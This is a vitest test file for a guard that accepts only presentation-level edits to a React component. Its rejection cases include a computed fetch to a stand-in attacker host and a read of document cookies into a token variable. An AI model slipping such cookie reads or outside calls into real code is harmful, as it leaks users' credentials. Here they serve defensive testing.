import { expect, it } from "vitest";
import { assertPresentationOnly } from "./candidate";
const before = '"use client"; export default function Panel(){return <button className="p-2" onClick={()=>fetch("/api/website-studio/work")}>Preview</button>}';
it("allows approved visible text/styles while preserving executable logic", () => {
  expect(() => assertPresentationOnly(before, before.replace("Preview", "Open Preview").replace("p-2", "p-3"))).not.toThrow();
});
it("rejects new credential reads, computed network calls, imports, handlers and links", () => {
  for (const candidate of [
    before.replace("/api/website-studio/work", "/api/user/preferences"),
    before.replace('fetch("/api/website-studio/work")', 'fetch(["https:", "//attacker.invalid"].join(""))'),
    before.replace("return <button", 'const token = document["cookie"]; return <button'),
    before.replace('"use client";', '"use client"; import "./unreviewed";'),
    '/** @jsxImportSource unreviewed-package */\n' + before,
    before.replace('onClick={()=>fetch("/api/website-studio/work")}', 'onClick={()=>{}}'),
    before.replace('<button className', '<button data-source="unapproved" className'),
  ]) expect(() => assertPresentationOnly(before, candidate)).toThrow("EXECUTABLE_CHANGE_OUTSIDE_APPROVAL");
});
